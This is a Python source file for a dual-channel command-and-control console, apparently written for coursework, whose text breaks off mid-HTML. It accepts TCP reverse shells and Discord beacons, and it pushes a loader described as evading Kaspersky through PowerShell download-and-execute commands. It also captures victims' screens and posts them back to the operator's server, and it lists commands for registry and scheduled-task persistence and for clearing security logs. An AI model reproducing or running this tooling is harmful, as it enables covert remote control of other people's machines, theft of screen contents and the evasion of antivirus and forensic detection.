"""
cheyanne_c2_v2.py — Unified C2 Shell (Discord + TCP Reverse Shell)
================================================================
22DIV / george wu
Classification: UNCLASSIFIED // ACADEMIC USE ONLY

Dual-channel C2 operator console:
  Channel 1: Discord webhook — monitors recon, heartbeats, logs output
  Channel 2: TCP listener (port 4443) — accepts reverse shell connections

When cheyanne_shell.exe connects, it auto-registers as a session.
'interact <id>' routes commands through the TCP socket.
All output is logged to Discord AND local JSONL.

Usage:
    python shell\\vader_c2_v2.py
    python shell\\vader_c2_v2.py --port 4443
"""

import os
import sys
import json
import time
import socket
import select
import threading
from datetime import datetime

try:
    import readline
except ImportError:
    try:
        import pyreadline3 as readline
    except ImportError:
        readline = None

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    import urllib.request
    import urllib.error
    HAS_REQUESTS = False

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        os.environ.setdefault("PYTHONIOENCODING", "utf-8")

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
ROOT_DIR = os.path.dirname(SCRIPT_DIR)
LOG_DIR = os.path.join(ROOT_DIR, "reporting", "c2_logs")

GREEN  = "\033[38;2;0;255;65m"
RED    = "\033[38;2;255;68;68m"
AMBER  = "\033[38;2;255;176;0m"
CYAN   = "\033[38;2;0;229;255m"
DIM    = "\033[38;2;85;85;85m"
MUTED  = "\033[38;2;136;136;136m"
TEXT   = "\033[38;2;204;204;204m"
WHITE  = "\033[38;2;255;255;255m"
BOLD   = "\033[1m"
RST    = "\033[0m"

LISTEN_PORT = 4443

COMMANDS = ["sessions", "interact", "ls", "ref", "log", "train", "help", "exit", "quit", "back",
            "deploy", "screenshot", "watch", "kill", "recon", "persist", "shell"]


class VaderCompleter:
    def __init__(self, c2):
        self.c2 = c2

    def complete(self, text, state):
        line = readline.get_line_buffer().lstrip() if readline else ""
        parts = line.split()

        if len(parts) <= 1 and not line.endswith(" "):
            matches = [c + " " for c in COMMANDS if c.startswith(text.lower())]
        elif parts and parts[0].lower() in ("interact", "use", "i", "kill"):
            prefix = text.lower()
            matches = [sid for sid in self.c2.sessions if sid.startswith(prefix)]
        else:
            matches = []

        return matches[state] if state < len(matches) else None


def load_env(env_path=None):
    paths = [env_path, os.path.join(ROOT_DIR, ".env"), os.path.join(ROOT_DIR, "agent", ".env")]
    for p in paths:
        if p and os.path.exists(p):
            with open(p) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#") and "=" in line:
                        k, v = line.split("=", 1)
                        os.environ.setdefault(k.strip(), v.strip())
            return p
    return None


def http_post(url, payload, headers=None):
    if HAS_REQUESTS:
        r = requests.post(url, json=payload, headers=headers or {}, timeout=10)
        return r.status_code
    else:
        data = json.dumps(payload).encode("utf-8")
        hdrs = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
        if headers:
            hdrs.update(headers)
        req = urllib.request.Request(url, data=data, headers=hdrs)
        try:
            return urllib.request.urlopen(req, timeout=10).status
        except urllib.error.HTTPError as e:
            return e.code


def http_get(url, headers=None):
    if HAS_REQUESTS:
        r = requests.get(url, headers=headers or {}, timeout=10)
        return r.status_code, r.json() if r.status_code == 200 else []
    else:
        hdrs = {"User-Agent": "Mozilla/5.0"}
        if headers:
            hdrs.update(headers)
        req = urllib.request.Request(url, headers=hdrs)
        try:
            resp = urllib.request.urlopen(req, timeout=10)
            return resp.status, json.loads(resp.read().decode("utf-8"))
        except urllib.error.HTTPError as e:
            return e.code, []


class Session:
    def __init__(self, session_id, hostname="unknown", addr=None, sock=None):
        self.id = session_id
        self.hostname = hostname
        self.first_seen = datetime.now()
        self.last_seen = datetime.now()
        self.addr = addr
        self.sock = sock
        self.user = ""
        self.ip = addr[0] if addr else ""
        self.os_info = "Windows"
        self.recon_data = ""
        self.channel = "tcp" if sock else "discord"
        self.alive = True

    def tag(self):
        parts = [self.hostname]
        if self.user:
            parts.append(self.user)
        return "\\".join(parts)

    def since_last(self):
        delta = datetime.now() - self.last_seen
        secs = int(delta.total_seconds())
        if secs < 60:
            return f"{secs}s ago"
        return f"{secs // 60}m ago"

    def send(self, data):
        if self.sock and self.alive:
            try:
                self.sock.sendall((data + "\n").encode())
                return True
            except (OSError, BrokenPipeError):
                self.alive = False
                return False
        return False

    def recv(self, timeout=5):
        if not self.sock or not self.alive:
            return None
        try:
            self.sock.settimeout(timeout)
            chunks = []
            while True:
                try:
                    d = self.sock.recv(4096)
                    if not d:
                        self.alive = False
                        break
                    chunks.append(d.decode("utf-8", errors="replace"))
                    if len(d) < 4096:
                        # short read — pause briefly then check for trailing data
                        self.sock.settimeout(0.5)
                        try:
                            d2 = self.sock.recv(4096)
                            if d2:
                                chunks.append(d2.decode("utf-8", errors="replace"))
                                continue
                        except socket.timeout:
                            pass
                        break
                except socket.timeout:
                    break
            return "".join(chunks) if chunks else None
        except (OSError, ConnectionResetError):
            self.alive = False
            return None


class VaderC2:
    def __init__(self, webhook_url, bot_token, channel_id, port=LISTEN_PORT):
        self.webhook_url = webhook_url
        self.bot_token = bot_token
        self.channel_id = channel_id
        self.port = port
        self.sessions = {}
        self.running = True
        self.active_session = None
        self.command_log = []
        self.last_msg_id = None
        self.listener_sock = None
        self.deployed_this_session = False

        os.makedirs(LOG_DIR, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log_path = os.path.join(LOG_DIR, f"c2_v2_{ts}.jsonl")

    def log_event(self, event_type, session_id=None, data=None):
        entry = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "event": event_type,
        }
        if session_id:
            entry["session_id"] = session_id
        if data:
            entry["data"] = str(data)[:2000]
        with open(self.log_path, "a") as f:
            f.write(json.dumps(entry) + "\n")
        self.command_log.append(entry)

    def discord_log(self, msg):
        if self.webhook_url:
            try:
                http_post(self.webhook_url, {"content": msg[:1990]})
            except Exception:
                pass

    def find_session(self, sid_prefix="", prompt_if_ambiguous=True):
        if sid_prefix:
            matches = [s for s in self.sessions if s.startswith(sid_prefix)]
            if not matches:
                print(f"  {RED}[!] No session matching '{sid_prefix}'{RST}")
                return None
            if len(matches) == 1:
                return self.sessions[matches[0]]
            # multiple matches for prefix — fall through to prompt
        else:
            matches = list(self.sessions.keys())

        if not matches:
            return None

        # single session — just return it
        if len(matches) == 1:
            return self.sessions[matches[0]]

        # multiple sessions — if a prefix was given, use best match (TCP first)
        # if no prefix, prompt the user to pick
        tcp = [s for s in matches if self.sessions[s].channel == "tcp" and self.sessions[s].alive]
        disc = [s for s in matches if self.sessions[s].channel == "discord"]

        if not sid_prefix and prompt_if_ambiguous and len(matches) > 1:
            print(f"\n  {CYAN}[?] Multiple sessions — pick one:{RST}")
            ordered = tcp + [s for s in disc if s not in tcp]
            for i, sid in enumerate(ordered):
                s = self.sessions[sid]
                tag = f"{GREEN}tcp*{RST}" if s.channel == "tcp" and s.alive else f"{MUTED}discord{RST}"
                print(f"    [{i}] {sid[:8]}  {s.hostname:<20} {tag}")
            try:
                choice = input(f"\n  {DIM}Select [0-{len(ordered)-1}] or partial ID: {RST}").strip()
                if choice.isdigit() and int(choice) < len(ordered):
                    return self.sessions[ordered[int(choice)]]
                # treat as prefix
                pfx = [s for s in ordered if s.startswith(choice)]
                if pfx:
                    return self.sessions[pfx[0]]
                print(f"  {RED}[!] Invalid selection{RST}")
                return None
            except (KeyboardInterrupt, EOFError):
                print()
                return None

        # prefix given or no prompt — prefer TCP
        if tcp:
            return self.sessions[tcp[0]]
        if disc:
            return self.sessions[disc[0]]
        return None

    def send_to_session(self, s, cmd_str):
        if s.channel == "tcp" and s.alive:
            try:
                s.sock.sendall((cmd_str + "\n").encode("utf-8"))
                return True
            except Exception:
                return False
        elif s.channel == "discord":
            return self.send_discord_cmd(s.id, cmd_str)
        return False

    def send_discord_cmd(self, session_id, command):
        if not self.bot_token or not self.channel_id:
            return False
        url = f"https://discord.com/api/v10/channels/{self.channel_id}/messages"
        headers = {"Authorization": f"Bot {self.bot_token}"}
        payload = json.dumps({"type": "cmd", "session": session_id, "command": command})
        status = http_post(url, {"content": payload}, headers)
        return 200 <= status < 300

    def poll_discord_output(self, session_id, timeout=15):
        start = time.time()
        seen = set()
        msgs = self.read_channel(limit=5)
        for m in msgs:
            seen.add(m.get("id", ""))

        while time.time() - start < timeout:
            time.sleep(2)
            msgs = self.read_channel(limit=10)
            for msg in reversed(msgs):
                msg_id = msg.get("id", "")
                if msg_id in seen:
                    continue
                seen.add(msg_id)
                content = msg.get("content", "").strip()
                try:
                    data = json.loads(content)
                    if (data.get("type") == "output" and
                        data.get("session") == session_id):
                        return data.get("data", "")
                except (json.JSONDecodeError, KeyError):
                    pass
        return None

    # ── TCP Listener ──

    def _ensure_file_server(self, my_ip, port=8890):
        if getattr(self, "_file_server_running", False):
            return
        from http.server import HTTPServer, SimpleHTTPRequestHandler
        import functools
        handler = functools.partial(SimpleHTTPRequestHandler, directory=ROOT_DIR)
        handler.log_message = lambda *a: None
        try:
            srv = HTTPServer(("0.0.0.0", port), handler)
            t = threading.Thread(target=srv.serve_forever, daemon=True)
            t.start()
            self._file_server_running = True
            print(f"  {GREEN}[*] File server started: http://{my_ip}:{port}/ (serving {ROOT_DIR}){RST}")
        except OSError:
            self._file_server_running = True  # already bound, assume running

    def start_listener(self):
        self.listener_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener_sock.bind(("0.0.0.0", self.port))
        self.listener_sock.listen(5)
        self.listener_sock.settimeout(1)

        t = threading.Thread(target=self._accept_loop, daemon=True)
        t.start()

    def _accept_loop(self):
        while self.running:
            try:
                conn, addr = self.listener_sock.accept()
                t = threading.Thread(target=self._handle_connect, args=(conn, addr), daemon=True)
                t.start()
            except socket.timeout:
                continue
            except OSError:
                break

    def _handle_connect(self, conn, addr):
        import hashlib
        raw = f"{addr[0]}-{addr[1]}-{time.time()}"
        sid = hashlib.md5(raw.encode()).hexdigest()[:8]

        # drain the initial banner (cmd.exe sends prompt on connect)
        conn.settimeout(3)
        banner = ""
        try:
            while True:
                d = conn.recv(4096)
                if not d:
                    break
                banner += d.decode("utf-8", errors="replace")
                if len(d) < 4096:
                    break
        except socket.timeout:
            pass

        # try to get hostname
        hostname = addr[0]
        try:
            conn.sendall(b"hostname\n")
            conn.settimeout(3)
            resp = b""
            while True:
                d = conn.recv(4096)
                if not d:
                    break
                resp += d
                if len(d) < 4096:
                    break
            lines = resp.decode("utf-8", errors="replace").strip().split("\n")
            skip = ("microsoft", "copyright", "(c)", "c:\\", "c:/")
            for line in lines:
                line = line.strip()
                if not line:
                    continue
                low = line.lower()
                if line.endswith(">") or "\\>" in line:
                    continue
                if any(s in low for s in skip):
                    continue
                hostname = line
                break
        except (socket.timeout, OSError):
            pass

        s = Session(sid, hostname, addr, conn)
        self.sessions[sid] = s

        self.notify(f"{GREEN}[+] SHELL: {sid} connected from {addr[0]}:{addr[1]} ({hostname}){RST}")
        self.log_event("shell_connect", sid, f"{addr[0]}:{addr[1]} {hostname}")
        self.discord_log(f"[SHELL] New reverse shell: {sid} from {addr[0]}:{addr[1]} ({hostname})")

    # ── Discord Polling ──

    def read_channel(self, limit=20):
        if not self.bot_token or not self.channel_id:
            return []
        url = f"https://discord.com/api/v10/channels/{self.channel_id}/messages?limit={limit}"
        headers = {"Authorization": f"Bot {self.bot_token}"}
        try:
            status, messages = http_get(url, headers)
            return messages if status == 200 else []
        except Exception:
            return []

    def _ensure_discord_session(self, session_id, hostname="unknown", data=""):
        if session_id not in self.sessions:
            s = Session(session_id, hostname)
            s.channel = "discord"
            s.recon_data = data
            for line in data.split("\n"):
                line = line.strip()
                if line.startswith("user:"):
                    s.user = line.split(":", 1)[1].strip()
                elif "IPv4 Address" in line and ":" in line:
                    s.ip = line.rsplit(":", 1)[1].strip().rstrip("(Preferred)")
            self.sessions[session_id] = s
            self.notify(f"{GREEN}[+] BEACON: {session_id} ({s.tag()}){RST}")
            self.log_event("beacon_new", session_id, s.tag())
        else:
            self.sessions[session_id].last_seen = datetime.now()

    def parse_messages(self, messages):
        import re
        for msg in reversed(messages):
            msg_id = msg.get("id", "")
            content = msg.get("content", "").strip()

            if self.last_msg_id and int(msg_id) <= int(self.last_msg_id):
                continue

            try:
                data = json.loads(content)
            except (json.JSONDecodeError, ValueError):
                if '"session"' in content:
                    sid_m = re.search(r'"session"\s*:\s*"([a-f0-9]+)"', content)
                    host_m = re.search(r'"hostname"\s*:\s*"([^"]+)"', content)
                    if sid_m:
                        self._ensure_discord_session(sid_m.group(1),
                            host_m.group(1) if host_m else "unknown")
                self.last_msg_id = msg_id
                continue

            msg_type = data.get("type")
            session_id = data.get("session")
            hostname = data.get("hostname", "unknown")

            if not session_id:
                self.last_msg_id = msg_id
                continue

            if msg_type == "recon":
                self._ensure_discord_session(session_id, hostname, data.get("data", ""))
            elif msg_type == "output":
                self._ensure_discord_session(session_id, hostname)
                output = data.get("data", "")
                if self.active_session and self.active_session.id == session_id:
                    print(f"\n{output}")
                else:
                    preview = output[:120].replace("\n", " ")
                    self.notify(f"{CYAN}[<] {session_id}: {preview}{RST}")
                self.log_event("output_recv", session_id, output)
            elif msg_type == "heartbeat":
                self._ensure_discord_session(session_id, hostname)

            self.last_msg_id = msg_id

    def poll_loop(self):
        while self.running:
            try:
                messages = self.read_channel(limit=10)
                if messages:
                    self.parse_messages(messages)
            except Exception:
                pass
            # check TCP session liveness
            for sid, s in list(self.sessions.items()):
                if s.channel == "tcp" and s.sock and not s.alive:
                    self.notify(f"{RED}[-] SHELL LOST: {sid} ({s.hostname}){RST}")
                    self.log_event("shell_disconnect", sid)
                    s.channel = "dead"
            time.sleep(3)

    # ── UI ──

    def notify(self, msg):
        ts = datetime.now().strftime("%H:%M:%S")
        if self.active_session:
            sys.stdout.write(f"\n  [{ts}] {msg}\n")
            sys.stdout.flush()
        else:
            print(f"\n  [{ts}] {msg}")

    def cmd_sessions(self):
        if not self.sessions:
            print(f"  {MUTED}No sessions. Waiting for connections...{RST}")
            return
        print()
        print(f"  {CYAN}  ID        Hostname                  Channel   IP              Last Seen{RST}")
        print(f"  {CYAN}  ──        ────────                  ───────   ──              ─────────{RST}")
        for sid, s in self.sessions.items():
            ch_color = GREEN if s.channel == "tcp" and s.alive else AMBER if s.channel == "discord" else RED
            ch_label = f"{s.channel}{'*' if s.channel == 'tcp' and s.alive else ''}"
            print(f"    {GREEN}{sid}{RST}  {WHITE}{s.hostname:<26s}{RST}{ch_color}{ch_label:<10s}{RST}{DIM}{s.ip:<16s}{RST}{AMBER}{s.since_last()}{RST}")
        print()
        tcp_count = sum(1 for s in self.sessions.values() if s.channel == "tcp" and s.alive)
        disc_count = sum(1 for s in self.sessions.values() if s.channel == "discord")
        print(f"  {DIM}Total: {len(self.sessions)} session(s) — {tcp_count} shell, {disc_count} beacon{RST}")
        print()

    def cmd_interact(self, session_id):
        # partial match
        matches = [sid for sid in self.sessions if sid.startswith(session_id)]
        if len(matches) == 1:
            session_id = matches[0]
        elif len(matches) == 0 and len(self.sessions) == 1:
            session_id = list(self.sessions.keys())[0]
        elif len(matches) > 1:
            print(f"  {RED}[!] Ambiguous: {', '.join(matches)}{RST}")
            return

        if session_id not in self.sessions:
            print(f"  {RED}[!] Session {session_id} not found{RST}")
            return

        s = self.sessions[session_id]
        self.active_session = s

        if s.channel == "tcp" and s.alive:
            print(f"\n  {GREEN}[*] Interactive shell: {s.id} ({s.tag()}) via TCP{RST}")
            print(f"  {AMBER}[*] Type 'back' to return. Commands execute live.{RST}\n")
            self._tcp_interact(s)
        elif s.channel == "discord":
            if not self.bot_token or not self.channel_id:
                print(f"  {RED}[!] Discord bot token or channel ID not set — can't send commands{RST}")
            else:
                print(f"\n  {GREEN}[*] Interactive shell: {s.id} ({s.tag()}) via Discord{RST}")
                print(f"  {AMBER}[*] Type 'back' to return. Commands route through Discord API.{RST}")
                print(f"  {MUTED}[*] Latency: ~5-10s per command (polling interval){RST}\n")
                self._discord_interact(s)
        else:
            print(f"  {RED}[!] Session {session_id} is dead{RST}")

        self.active_session = None

    def _tcp_interact(self, s):
        # drain any pending output
        s.recv(timeout=1)

        try:
            while self.running and s.alive:
                try:
                    prompt = f"  {RED}{s.hostname}{RST}{DIM}>{RST} "
                    cmd = input(prompt)
                except (EOFError, KeyboardInterrupt):
                    break

                cmd = cmd.strip()
                if not cmd:
                    continue
                if cmd.lower() == "back":
                    break

                self.log_event("command_sent", s.id, cmd)

                if not s.send(cmd):
                    print(f"  {RED}[!] Connection lost{RST}")
                    break

                time.sleep(1.0)
                output = s.recv(timeout=3)
                if output:
                    print(output, end="")
                    self.log_event("output_recv", s.id, output)
                    # log to Discord (truncated)
                    self.discord_log(f"[{s.id}] {cmd}\n{output[:500]}")

                if not s.alive:
                    print(f"  {RED}[!] Connection lost{RST}")
                    break

        except KeyboardInterrupt:
            print(f"\n  {MUTED}[*] Returning...{RST}")

        self.active_session = None
        print(f"\n  {CYAN}[*] Back to CHEYANNE C2 console{RST}\n")

    def _discord_interact(self, s):
        try:
            while self.running:
                try:
                    prompt = f"  {AMBER}{s.hostname}{RST}{DIM}>{RST} "
                    cmd = input(prompt)
                except (EOFError, KeyboardInterrupt):
                    break

                cmd = cmd.strip()
                if not cmd:
                    continue
                if cmd.lower() == "back":
                    break

                self.log_event("command_sent", s.id, cmd)
                print(f"  {DIM}[*] Sending via Discord...{RST}")

                if not self.send_discord_cmd(s.id, cmd):
                    print(f"  {RED}[!] Failed to send command to Discord{RST}")
                    continue

                output = self.poll_discord_output(s.id, timeout=90)
                if output:
                    print(output)
                    self.log_event("output_recv", s.id, output)
                    s.last_seen = datetime.now()
                else:
                    print(f"  {AMBER}[*] No response within 90s — beacon may be slow or offline{RST}")
                    print(f"  {DIM}    Try again — Discord polling interval can lag 30-60s{RST}")

        except KeyboardInterrupt:
            print(f"\n  {MUTED}[*] Returning...{RST}")

        self.active_session = None
        print(f"\n  {CYAN}[*] Back to CHEYANNE C2 console{RST}\n")

    def cmd_log(self):
        if not self.command_log:
            print(f"  {MUTED}No log entries.{RST}")
            return
        print(f"\n  {CYAN}── Command Log ──{RST}\n")
        for entry in self.command_log[-30:]:
            ts = entry.get("timestamp", "?")
            ev = entry.get("event", "?")
            sid = entry.get("session_id", "")
            data = entry.get("data", "")
            if ev == "command_sent":
                print(f"    {ts} | {GREEN}{sid[:8]}{RST} | {AMBER}CMD:{RST} {data}")
            elif ev == "output_recv":
                preview = data[:80].replace("\n", " ")
                print(f"    {ts} | {GREEN}{sid[:8]}{RST} | {CYAN}OUT:{RST} {preview}")
            else:
                print(f"    {ts} | {DIM}{ev}{RST}")
        print()

    def cmd_train(self, text=""):
        msg = text or f"[TRAINING LOG] {datetime.now().strftime('%Y-%m-%d %H:%M')}\nSessions: {len(self.sessions)}\nShells: {sum(1 for s in self.sessions.values() if s.channel == 'tcp' and s.alive)}\nCommands: {sum(1 for e in self.command_log if e.get('event') == 'command_sent')}"
        self.discord_log(msg)
        print(f"  {GREEN}[*] Training log posted to #c2{RST}")

    def cmd_ref(self):
        print(f"""
  {CYAN}── Target Command Reference ──{RST}

  {AMBER}RECON & ENUMERATION{RST}
    whoami                               Current user
    whoami /priv                         Privileges
    net user                             All local users
    net localgroup Administrators        Admin group
    systeminfo                           OS version, patches
    ipconfig /all                        Network config
    netstat -ano                         Connections + PIDs
    tasklist                             Running processes

  {AMBER}FILE OPS{RST}
    dir <path>                           List directory
    type <file>                          Read file
    copy <src> <dst>                     Copy file
    del <file>                           Delete file
    mkdir <dir>                          Create directory

  {AMBER}PERSISTENCE{RST}
    reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Name /d "path" /f
    schtasks /create /tn Name /tr "path" /sc onlogon
    schtasks /query /fo LIST             List scheduled tasks

  {AMBER}PROCESS MANAGEMENT{RST}
    taskkill /F /PID <pid>               Kill by PID
    taskkill /F /IM <name>.exe           Kill by name

  {AMBER}OPSEC{RST}
    del /f <file>                        Remove evidence
    wevtutil cl Security                 Clear security log (admin)
""")

    def cmd_help(self):
        print(f"""
  {CYAN}── CHEYANNE C2 v2 Commands ──{RST}

    {WHITE}sessions / ls{RST}              List all sessions (shell + beacon)
    {WHITE}interact <id>{RST}              Interactive shell (TCP or Discord sessions)
    {WHITE}ref{RST}                        Target command cheat sheet
    {WHITE}log{RST}                        Show command history
    {WHITE}train{RST}                      Post training log to #c2
    {WHITE}help{RST}                       Show this help
    {WHITE}exit / quit{RST}                Shutdown

  {AMBER}── SHORTCUTS (no 'interact' needed) ──{RST}

    {WHITE}deploy [sid]{RST}               Kill old implant + download + launch fresh
    {WHITE}screenshot [sid]{RST}            Capture screen → auto-pull + open
    {WHITE}watch [sec] [sid]{RST}           Live screen stream in browser (Ctrl+C to stop)
    {WHITE}kill <proc> [sid]{RST}           taskkill /F /IM on target
    {WHITE}recon [sid]{RST}                 systeminfo + ipconfig + whoami + tasklist
    {WHITE}persist [sid]{RST}               Set HKCU\\Run registry persistence

  {DIM}Partial session IDs work — 'interact c0' matches 'c0205271'{RST}
  {DIM}TCP sessions marked with * are live shells{RST}
  {DIM}Discord sessions support full interactive shell (via API polling){RST}
  {DIM}Shortcuts auto-find first TCP session if no sid given{RST}
""")

    def banner(self):
        print()
        print(f"  {CYAN}╔══════════════════════════════════════════════════════╗")
        print(f"  ║  CHEYANNE C2 v2 — DUAL CHANNEL (Discord + TCP)      ║")
        print(f"  ║  22DIV / george wu                                   ║")
        print(f"  ╚══════════════════════════════════════════════════════╝{RST}")
        print(f"  {CYAN}│{RST}  TCP Listener:  0.0.0.0:{self.port}")
        print(f"  {CYAN}│{RST}  Discord:       {'OK' if self.webhook_url else 'DISABLED'}")
        print(f"  {CYAN}│{RST}  Log:           {self.log_path}")
        print(f"  {CYAN}│{RST}  Started:       {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"  {CYAN}╘══════════════════════════════════════════════════════{RST}")
        print()

    def run(self):
        if sys.platform == "win32":
            os.system("")

        self.banner()
        self.log_event("c2_start", data=f"dual_channel port={self.port}")

        # start TCP listener
        self.start_listener()
        print(f"  {GREEN}[*] TCP listener active on port {self.port}{RST}")

        # start Discord poller
        self.poll_thread = threading.Thread(target=self.poll_loop, daemon=True)
        self.poll_thread.start()
        print(f"  {GREEN}[*] Discord poller active{RST}")

        # check existing Discord sessions
        messages = self.read_channel(limit=20)
        if messages:
            self.parse_messages(messages)
            if self.sessions:
                print(f"  {GREEN}[+] Found {len(self.sessions)} existing session(s){RST}")

        if readline:
            comp = VaderCompleter(self)
            readline.set_completer(comp.complete)
            readline.set_completer_delims(" ")
            readline.parse_and_bind("tab: complete")
            print(f"  {GREEN}[*] Tab completion active{RST}")

        print(f"\n  {AMBER}[*] Waiting for connections... Type 'help' for commands{RST}\n")

        try:
            while self.running:
                try:
                    raw = input(f"  {CYAN}chey>{RST} ")
                except (EOFError, KeyboardInterrupt):
                    print()
                    break

                parts = raw.strip().split()
                if not parts:
                    continue

                cmd = parts[0].lower()
                args = parts[1:]

                if cmd in ("sessions", "ls"):
                    self.cmd_sessions()
                elif cmd in ("interact", "use", "i"):
                    sid = args[0] if args else ""
                    self.cmd_interact(sid)
                elif cmd == "ref":
                    self.cmd_ref()
                elif cmd == "log":
                    self.cmd_log()
                elif cmd == "train":
                    self.cmd_train(" ".join(args) if args else "")
                elif cmd == "help":
                    self.cmd_help()
                elif cmd in ("exit", "quit"):
                    break

                # ── SHORTCUTS ──
                elif cmd == "deploy":
                    sid = args[0] if args else ""
                    s = self.find_session(sid)
                    if not s:
                        print(f"  {RED}[!] No session matching '{sid}'. Use 'sessions' to find one.{RST}")
                    else:
                        try:
                            _s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                            _s.connect(("8.8.8.8", 80))
                            my_ip = _s.getsockname()[0]
                            _s.close()
                        except Exception:
                            my_ip = "192.168.1.92"
                        # ghost_loader_v3 = CLEAN vs Kaspersky (parent spoof via explorer.exe)
                        # vader_shell.exe is quarantined by KAV — never deploy it directly
                        self._ensure_file_server(my_ip)
                        deploy_cmd = (
                            f'taskkill /F /IM ghost_loader.exe 2>nul & '
                            f'taskkill /F /IM svchost_update.exe 2>nul & '
                            f'powershell -c "'
                            f'Invoke-WebRequest -Uri \'http://{my_ip}:8890/shell/ghost_loader.exe\' '
                            f'-OutFile \'C:\\Users\\Public\\ghost_loader.exe\'; '
                            f'Start-Process \'C:\\Users\\Public\\ghost_loader.exe\'"'
                        )
                        print(f"  {AMBER}[*] Deploying ghost_loader_v3 via {s.id[:8]} ({s.channel})...{RST}")
                        print(f"  {DIM}    Serving: http://{my_ip}:8890/shell/ghost_loader.exe{RST}")
                        if self.send_to_session(s, deploy_cmd):
                            print(f"  {GREEN}[+] Deploy sent — ghost_loader_v3 (KAV-clean) delivering TCP shell{RST}")
                            print(f"  {DIM}    TCP callback expected on port {self.port} in ~5-10s{RST}")
                            self.deployed_this_session = True
                        else:
                            print(f"  {RED}[!] Send failed{RST}")

                elif cmd == "screenshot":
                    sid = args[0] if args else ""
                    s = self.find_session(sid)
                    if not s:
                        print(f"  {RED}[!] No session matching '{sid}'.{RST}")
                    elif s.channel == "discord":
                        print(f"  {AMBER}[*] Requesting screenshot via Discord ({s.id[:8]})...{RST}")
                        if self.send_discord_cmd(s.id, "SCREENSHOT"):
                            output = self.poll_discord_output(s.id, timeout=30)
                            if output:
                                print(f"  {GREEN}[+] {output}{RST}")
                            else:
                                print(f"  {AMBER}[*] No response — check Discord channel for attachment{RST}")
                        else:
                            print(f"  {RED}[!] Failed to send command{RST}")
                    else:
                        s = s
                        try:
                            _s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                            _s.connect(("8.8.8.8", 80))
                            my_ip = _s.getsockname()[0]
                            _s.close()
                        except Exception:
                            my_ip = "192.168.1.92"

                        recv_port = 8891
                        ts = int(time.time())
                        ss_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "screenshots")
                        os.makedirs(ss_dir, exist_ok=True)
                        out_path = os.path.join(ss_dir, f"radon_{ts}.png")

                        received = threading.Event()

                        def _receive_screenshot():
                            from http.server import HTTPServer, BaseHTTPRequestHandler
                            class H(BaseHTTPRequestHandler):
                                def do_POST(self):
                                    length = int(self.headers.get("Content-Length", 0))
                                    data = self.rfile.read(length)
                                    with open(out_path, "wb") as f:
                                        f.write(data)
                                    self.send_response(200)
                                    self.end_headers()
                                    self.wfile.write(b"OK")
                                    received.set()
                                def log_message(self, *a):
                                    pass
                            srv = HTTPServer(("0.0.0.0", recv_port), H)
                            srv.timeout = 30
                            srv.handle_request()
                            srv.server_close()

                        t = threading.Thread(target=_receive_screenshot, daemon=True)
                        t.start()

                        shot_cmd = (
                            'powershell -c "Add-Type -AssemblyName System.Windows.Forms; '
                            '$bmp = [System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, '
                            '[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); '
                            '$g = [System.Drawing.Graphics]::FromImage($bmp); '
                            '$g.CopyFromScreen(0,0,0,0,$bmp.Size); '
                            '$bmp.Save(\'C:\\Users\\Public\\screen.png\'); '
                            '$g.Dispose(); $bmp.Dispose(); '
                            f'Invoke-WebRequest -Uri \'http://{my_ip}:{recv_port}/screen.png\' '
                            '-Method POST -InFile \'C:\\Users\\Public\\screen.png\' '
                            '-ContentType \'application/octet-stream\'; '
                            'echo SCREENSHOT_SENT"'
                        )
                        print(f"  {AMBER}[*] Capturing + pulling screen via {s.id[:8]}...{RST}")
                        try:
                            s.sock.sendall((shot_cmd + "\n").encode("utf-8"))
                            received.wait(timeout=30)
                            if received.is_set() and os.path.exists(out_path):
                                size = os.path.getsize(out_path)
                                print(f"  {GREEN}[+] Screenshot saved: {out_path} ({size:,} bytes){RST}")
                                try:
                                    import subprocess as _sp
                                    _sp.Popen(["explorer", out_path])
                                except Exception:
                                    pass
                            else:
                                print(f"  {AMBER}[*] Capture sent — file didn't arrive in 30s{RST}")
                                print(f"  {DIM}  Screenshot is on target at C:\\Users\\Public\\screen.png{RST}")
                        except Exception as e:
                            print(f"  {RED}[!] Send failed: {e}{RST}")

                elif cmd == "watch":
                    interval = int(args[0]) if args and args[0].isdigit() else 5
                    sid = args[1] if len(args) > 1 else (args[0] if args and not args[0].isdigit() else "")
                    s = self.find_session(sid)
                    if not s:
                        print(f"  {RED}[!] No session available.{RST}")
                    elif s.channel == "discord":
                        print(f"  {AMBER}[!] Watch requires TCP — live streaming can't route through Discord API.{RST}")
                        print(f"  {DIM}  Use 'screenshot' for single captures via Discord.{RST}")
                    else:
                        try:
                            _s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                            _s.connect(("8.8.8.8", 80))
                            my_ip = _s.getsockname()[0]
                            _s.close()
                        except Exception:
                            my_ip = "192.168.1.92"

                        recv_port = 8891
                        view_port = 8892
                        ss_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "screenshots")
                        os.makedirs(ss_dir, exist_ok=True)
                        latest_path = os.path.join(ss_dir, "latest.png")

                        from http.server import HTTPServer, BaseHTTPRequestHandler

                        LIVE_HTML = f"""<!DOCTYPE html>
<html><head><title>CHEYANNE — Live Screen</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{{margin:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh;overflow:hidden}}
img{{max-width:100vw;max-height:100vh;object-fit:contain}}
